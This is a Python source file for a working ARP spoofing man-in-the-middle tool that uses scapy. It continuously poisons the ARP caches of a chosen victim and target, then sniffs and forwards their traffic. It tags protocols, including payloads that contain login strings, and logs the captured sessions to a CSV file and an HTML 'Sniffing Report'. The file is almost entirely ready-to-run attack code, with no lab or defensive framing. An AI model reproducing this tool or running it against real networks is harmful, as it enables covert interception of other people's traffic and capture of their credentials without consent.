#!/usr/bin/env python3
# ARP Spoofing (Man-in-the-middle)

import argparse
from scapy.all import *
import time
import threading
import sys
import signal

# Global flag to handle graceful termination
running = True

# Application port mappings
applicationPorts = {
    21: "FTP", 22: "SSH", 23: "Telnet",
    25: "SMTP", 53: "DNS", 67: "DHCP", 68: "DHCP",
    80: "HTTP", 443: "HTTPS", 110: "POP3",
    143: "IMAP", 389: "LDAP", 161: "SNMP",
    3306: "MySQL", 5432: "PostgreSQL"
}

def getApplicationProtocol(packet):
    """Identify application-layer protocols based on ports and payload."""
    protocols = []
    if packet.haslayer("TCP") or packet.haslayer("UDP"):
        sport = packet.sport
        dport = packet.dport
        if sport in applicationPorts:
            protocols.append(applicationPorts[sport])
        if dport in applicationPorts:
            protocols.append(applicationPorts[dport])
    
    if packet.haslayer("Raw"):
        payload = packet["Raw"].load.decode(errors="ignore").lower()
        if any(method in payload for method in ["get ", "post ", "put ", "delete ", "host: "]):
            protocols.append("HTTP")
        if "tls" in payload or "ssl" in payload:
            protocols.append("TLS/SSL")
        if "220" in payload and "ftp" in payload:
            protocols.append("FTP")
        if "ehlo" in payload or "mail from" in payload:
            protocols.append("SMTP")
        if "user" in payload and "pass" in payload:
            protocols.append("Telnet/FTP Login")
        if "bind" in payload or "query" in payload:
            protocols.append("DNS Query")
        if "mysql_native_password" in payload or "handshake" in payload:
            protocols.append("MySQL")
        if "postgresql" in payload or "scram-sha-256" in payload:
            protocols.append("PostgreSQL")
        if "ldap" in payload or "bindrequest" in payload:
            protocols.append("LDAP")
        if "snmp" in payload or "community" in payload:
            protocols.append("SNMP")
        if "dhcp" in payload or "discover" in payload:
            protocols.append("DHCP")
    
    return protocols

def arpSpoof(targetIp, spoofIp, iface):
    """Send ARP spoof packets to poison the target's ARP cache."""
    pkt = ARP(op=2, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
    print(f"Sending ARP spoof packets to target {targetIp}, impersonating {spoofIp}.")
    while running:
        send(pkt, iface=iface, verbose=False)
        time.sleep(1)

def forwardPacket(pkt, victimIp, targetIp, iface):
    """Forward packets only between victim and target."""
    if pkt.haslayer(IP):
        if (pkt[IP].src == victimIp and pkt[IP].dst == targetIp) or \
           (pkt[IP].src == targetIp and pkt[IP].dst == victimIp):
            sendp(pkt, iface=iface, verbose=False)

def logPacket(pkt, txt_file):
    """Log packet details to the text file in CSV format."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    if pkt.haslayer("TCP"):
        transport = "TCP"
        sport = pkt["TCP"].sport
        dport = pkt["TCP"].dport
    elif pkt.haslayer("UDP"):
        transport = "UDP"
        sport = pkt["UDP"].sport
        dport = pkt["UDP"].dport
    elif pkt.haslayer("ICMP"):
        transport = "ICMP"
        sport = ""
        dport = ""
    else:
        transport = "Other"
        sport = ""
        dport = ""
    protocols = getApplicationProtocol(pkt)
    app_protocols = ",".join(protocols) if protocols else ""
    line = f"{timestamp},{src_ip},{dst_ip},{transport},{sport},{dport},{app_protocols}\n"
    txt_file.write(line)
    txt_file.flush()

def generateHtmlReport(txtFilename):
    """Generate an HTML report from the text file data."""
    with open(txtFilename, "r") as txt_file:
        lines = txt_file.readlines()[1:]  # Skip header
        total_packets = len(lines)
        source_ips = set()
        dest_ips = set()
        transport_counts = {}
        app_protocol_counts = {}
        for line in lines:
            fields = line.strip().split(",")
            if len(fields) < 7:
                continue
            timestamp, src_ip, dst_ip, transport, sport, dport, app_protocols = fields
            source_ips.add(src_ip)
            dest_ips.add(dst_ip)
            transport_counts[transport] = transport_counts.get(transport, 0) + 1
            if app_protocols:
                protocols = app_protocols.split(",")
                for proto in protocols:
                    app_protocol_counts[proto] = app_protocol_counts.get(proto, 0) + 1
        
        html_content = f"""
        <html>
        <head><title>Sniffing Report</title></head>
        <body>
        <h1>Sniffing Report</h1>
        <p>Total packets captured: {total_packets}</p>
        <p>Unique source IPs: {', '.join(source_ips)}</p>
        <p>Unique destination IPs: {', '.join(dest_ips)}</p>
        <h2>Transport Protocol Counts</h2>
        <ul>
        """
        for transport, count in transport_counts.items():
            html_content += f"<li>{transport}: {count}</li>\n"
        html_content += "</ul>\n<h2>Application Protocol Counts</h2>\n<ul>\n"
        for proto, count in app_protocol_counts.items():
            html_content += f"<li>{proto}: {count}</li>\n"
        html_content += "</ul>\n</body>\n</html>"
        
        with open("report.html", "w") as html_file:
            html_file.write(html_content)
        print("HTML report generated: report.html")

def sniffPackets(victimIp, targetIp, iface, log=False):
    """Sniff packets, forward them, and optionally log to a text file."""
    txt_file = None
    if log:
        txtFilename = "sniffingData.txt"
        txt_file = open(txtFilename, "w")
        txt_file.write("Timestamp,Source IP,Destination IP,Transport Protocol,Source Port,Destination Port,Application Protocols\n")
        print(f"Starting packet sniffing on {iface} with logging to {txtFilename}")
    else:
        print(f"Starting packet sniffing on {iface}")
    
    def packetHandler(pkt):
        if pkt.haslayer(IP):
            if (pkt[IP].src == victimIp and pkt[IP].dst == targetIp) or \
               (pkt[IP].src == targetIp and pkt[IP].dst == victimIp):
                forwardPacket(pkt, victimIp, targetIp, iface)
                if log:
                    logPacket(pkt, txt_file)
    
    try:
        sniff(iface=iface, filter="ip", prn=packetHandler, store=0, timeout=None)
    except KeyboardInterrupt:
        print("\nStopping packet sniffing.")
    finally:
        if txt_file:
            txt_file.close()
            if log:
                generateHtmlReport("sniffingData.txt")

def startAttack(victimIp, targetIp, iface, report):
    """Start the ARP spoofing attack with optional reporting."""
    threading.Thread(target=arpSpoof, args=(victimIp, targetIp, iface), daemon=True).start()
    threading.Thread(target=arpSpoof, args=(targetIp, victimIp, iface), daemon=True).start()
    sniffPackets(victimIp, targetIp, iface, log=report)

def menu():
    """Interactive menu for user input."""
    RED = "\033[38;2;255;0;0m"
    RESET = "\033[0m"
    victimIp = input(f"{RED}\nHost IP: {RESET}")
    targetIp = input(f"{RED}Target IP: {RESET}")
    interface = input(f"{RED}Interface: {RESET}")
    while True:
        report_input = input("Want to create a report during the attack? [Y]es | [N]o: ")
        if report_input.lower() == "y":
            startAttack(victimIp, targetIp, interface, True)
            break
        elif report_input.lower() == "n":
            startAttack(victimIp, targetIp, interface, False)
            break
        else:
            print("Invalid input. Please enter 'Y' or 'N'.")

def terminal():
    """Handle command-line arguments."""
    parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-v", "--victimip", required=True, help="Victim IP address.")
    parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.")
    parser.add_argument("-r", "--report", action="store_true", help="Create a report.")
    args = parser.parse_args()
    startAttack(args.victimip, args.targetip, args.interface, args.report)

def signalHandler(sig, frame):
    """Handle Ctrl+C to stop the attack gracefully."""
    global running
    print("\nGracefully stopping attack...")
    running = False
    # Sniffing will stop via KeyboardInterrupt, and report generation will follow if enabled.

def main():
    signal.signal(signal.SIGINT, signalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()